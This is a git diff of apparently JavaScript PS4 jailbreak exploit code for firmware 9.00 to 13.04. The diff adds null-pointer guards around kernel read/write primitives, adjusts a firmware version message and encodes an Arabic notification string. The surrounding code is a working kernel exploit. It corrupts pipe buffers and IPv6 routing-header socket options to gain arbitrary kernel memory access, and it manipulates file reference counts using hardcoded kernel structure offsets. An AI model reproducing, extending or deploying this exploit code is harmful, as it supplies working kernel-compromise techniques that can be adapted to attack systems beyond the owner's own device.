@@ -226,9 +226,6 @@ var spawn_thr_args = malloc(0x80);
 var spawn_tid = malloc(0x8);
 var spawn_cpid = malloc(0x8);
 
-function arabic(str) {
-  return str.split('').map(c => '&#' + c.charCodeAt(0) + ';').join('');
-}
 
 function get_sockopt(sd, level, optname, optval, optlen) {
   // const len_ptr = malloc(4);
@@ -503,8 +500,12 @@ function nanosleep_fun(nsec) {
   nanosleep(nanosleep_timespec);
 }
 function wait_for(addr, threshold) {
+  if (!(threshold instanceof BigInt)) {
+    threshold = new BigInt(0x0, threshold);
+  }
+
   var spins = 0;
-  var MAX_SPINS = 100000; // أو أقل حسب إحساسك
+  var MAX_SPINS = 100000;
 
   while (!read64(addr).eq(threshold)) {
     nanosleep_fun(1);
@@ -649,7 +650,7 @@ function init() {
   };
 
   if (compare_version(FW_VERSION, '9.00') < 0 || compare_version(FW_VERSION, '13.04') > 0) {
-    log('Unsupported PS4 firmware\nSupported: 9.00-14.00\nAborting...');
+    log('Unsupported PS4 firmware\nSupported: 9.00-13.04\nAborting...');
     send_notification('Unsupported PS4 firmware\nAborting...');
     return false;
   }
@@ -854,7 +855,7 @@ function find_twins() {
         if (zeroMemoryCount >= 5) {
             log(' Jailbreak failed!');
             cleanup();
-            return BigInt_Error;
+            return false;
         }
 
     } else {
@@ -1077,10 +1078,24 @@ function exploit_phase_rw() {
 
   utils.notify('Jailbreak Success');
   utils.notify('Stability by M.ELHOUT');
-  utils.notify(arabic('سبحان الله وبحمده سبحان الله العظيم'));
+  utils.notify('&#1587;&#1576;&#1581;&#1575;&#1606;&#32;&#1575;&#1604;&#1604;&#1607;&#32;&#1608;&#1576;&#1581;&#1605;&#1583;&#1607;&#32;&#1587;&#1576;&#1581;&#1575;&#1606;&#32;&#1575;&#1604;&#1604;&#1607;&#32;&#1575;&#1604;&#1593;&#1592;&#1610;&#1605;');
 }
 function exploit_phase_jailbreak() {
   jailbreak();
+}
+function safe_fhold_fd(fd, label) {
+  if (fd < 0) {
+    log('safe_fhold_fd: invalid fd ' + fd + ' for ' + label);
+    return;
+  }
+
+  var fp = fget(fd);
+  if (!fp || fp.eq(0)) {
+    log('safe_fhold_fd: fget returned 0 for ' + label + ' (fd ' + fd + ')');
+    return;
+  }
+
+  fhold(fp);
 }
 function setup_arbitrary_rw() {
   log(' Exploit Read/Write...');
@@ -1143,11 +1158,11 @@ function setup_arbitrary_rw() {
     throw new Error(' Jailbreak failed - pipebuf write failed');
   }
 
-  // 8) زيادة refcount
-  fhold(fget(master_pipe[0]));
-  fhold(fget(master_pipe[1]));
-  fhold(fget(victim_pipe[0]));
-  fhold(fget(victim_pipe[1]));
+  // 8) زيادة refcount مع حراسة على fp
+  safe_fhold_fd(master_pipe[0], 'master_pipe[0]');
+  safe_fhold_fd(master_pipe[1], 'master_pipe[1]');
+  safe_fhold_fd(victim_pipe[0], 'victim_pipe[0]');
+  safe_fhold_fd(victim_pipe[1], 'victim_pipe[1]');
 
   // 9) تنظيف rthdr
   remove_rthr_from_socket(ipv6_socks[triplets[0]]);
@@ -1265,7 +1280,7 @@ function jailbreak() {
 }
 function fhold(fp) {
   // زيادة f_count مع حراسة بسيطة
-  if (fp.eq(0)) {
+  if (!fp || fp.eq(0)) {
     log('fhold: invalid fp (0)');
     return;
   }
@@ -1283,22 +1298,35 @@ function fget(fd) {
 }
 
 function remove_rthr_from_socket(fd) {
-  // In case last triplet was not found in kwriteslow
-  // At this point we don't care about twins/triplets
   if (fd <= 0) {
     log('remove_rthr_from_socket: invalid fd ' + fd);
     return;
   }
 
   var fp = fget(fd);
-  if (fp.eq(0)) {
+  if (!fp || fp.eq(0)) {
     log('remove_rthr_from_socket: fget returned 0 for fd ' + fd);
     return;
   }
 
   var f_data = kread64(fp.add(0x00));
+  if (!f_data || f_data.eq(0)) {
+    log('remove_rthr_from_socket: invalid f_data for fd ' + fd);
+    return;
+  }
+
   var so_pcb = kread64(f_data.add(0x18));
+  if (!so_pcb || so_pcb.eq(0)) {
+    log('remove_rthr_from_socket: invalid so_pcb for fd ' + fd);
+    return;
+  }
+
   var in6p_outputopts = kread64(so_pcb.add(0x118));
+  if (!in6p_outputopts || in6p_outputopts.eq(0)) {
+    log('remove_rthr_from_socket: invalid in6p_outputopts for fd ' + fd);
+    return;
+  }
+
   kwrite64(in6p_outputopts.add(0x68), new BigInt(0)); // ip6po_rhi_rthdr
 }
 
@@ -1334,8 +1362,6 @@ function kwrite(dest, src, n) {
 }
 
 function kread(dest, src, n) {
-  debug('Enter kread for src: ' + hex(src));
-
   if (dest.eq(0) || src.eq(0) || n <= 0) {
     log('kread: invalid dest/src/size');
     return BigInt_Error;
@@ -1343,6 +1369,7 @@ function kread(dest, src, n) {
 
   corrupt_pipe_buf(n, 0, 0, PAGE_SIZE, src);
   read(new BigInt(victimRpipeFd), dest, n);
+  return new BigInt(0);
 }
 function kwrite64(addr, val) {
   if (addr.eq(0)) {
